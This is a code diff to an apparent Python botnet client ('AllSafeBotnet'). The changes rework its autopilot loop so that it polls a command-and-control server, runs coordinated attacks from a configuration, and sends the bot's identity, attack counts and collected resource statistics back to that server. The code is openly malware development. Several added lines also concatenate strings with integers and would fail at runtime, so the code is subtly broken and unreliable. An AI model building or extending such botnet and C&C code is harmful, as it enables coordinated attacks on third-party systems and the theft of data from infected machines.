@@ -207,7 +207,7 @@ class AllSafeWorkerMaster():
         # loggins system statistics on local log file 
         # collecting stats...
         syssummary  = "system:  " + self._sysstats.getPlatformSummary() + "\n"
-        syssummary += "environ: " + self._sysstats.getEnvironmentSummary() + "\n\"
+        syssummary += "environ: " + self._sysstats.getEnvironmentSummary() + "\n"
         # printing in log
         logInfo(self._log, "\nSYSTEM STATISTICS: \n" + syssummary)
 
@@ -263,6 +263,7 @@ class AllSafeBotnet():
         to another process an attack to be carried.
         """
         self._attack_counter  = 0
+        self._attempt_counter = 0
         # initiliazing botnet client unique id
         self._botnet_identity = str(hash(os.path.expanduser('~')))
         # initializing queue 
@@ -277,14 +278,17 @@ class AllSafeBotnet():
         @param: configuration, string - path to the configuration file
         @return: a tuple (identification, attack_statistics_dictionary, attack_counter)
         """
-        self._attack_counter += 1
         self._botnet_instance = self.Botnet(configuration, self._botnet_queue)
-        botnet = self._botnet_instance
 
+        botnet = self._botnet_instance
         botnet.start()
+
         # retrieving statistics and joining
         attackstats = self._botnet_queue.get()
         botnet.join()
+
+        self._attack_counter += 1
+
         # returning statistics and counter
         return self._botnet_identity, attackstats, self._attack_counter
 
@@ -306,21 +310,21 @@ class AllSafeBotnet():
         @param: configuration, string - path to the configuration file
         @param: timer, int - time interval in seconds between each iteration
         """
-        # verify C&C
-        up = True
-        if not override:
-            up = logCCUpdate(server, self._botnet_identity, "starting up in autopilot mode - timing " + int(timer))
-        else:
-            up = False
-
         while True:
-            # attacking using configuration provided 
-            # or checking for C&C updated configuration
-            attackres = self.attack(configuration, override=up)
-            # updating C&C and its connection status
-            if not override:
-                up = logCCUpdate(server, attackres[0], attackres[1])
-            # sleeping
+            # override mode -> local configuration!
+            if override:
+                id, resources, counter = self.attack(configuration, override=True)
+            # periodically check for C&C to carry a coordinated attack
+            else:
+                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + self._attack_counter + "executing")
+                if up:
+                    try:
+                        id, resources, counter = self.attack(configuration, override=False)
+                        logCCUpdate(server, id, "attack n. " + str(counter) + " (failed " + self._attempt_counter + " times)" + "\n" + str(json.dumps(resources, indent=4)))
+                        self._attempt_counter = 0
+                    except Exception:
+                        self._attempt_counter += 1
+
             threadSleep(timer)
             
 
@@ -333,7 +337,10 @@ class AllSafeBotnet():
             self._configuration  = configuration
             self._override_conf  = override
             # initialize master
-            self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
+            try:
+                self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
+            except Exception:
+                raise Exception("Error in Botnet initialization!")
 
         def run(self):
             # starting the attack
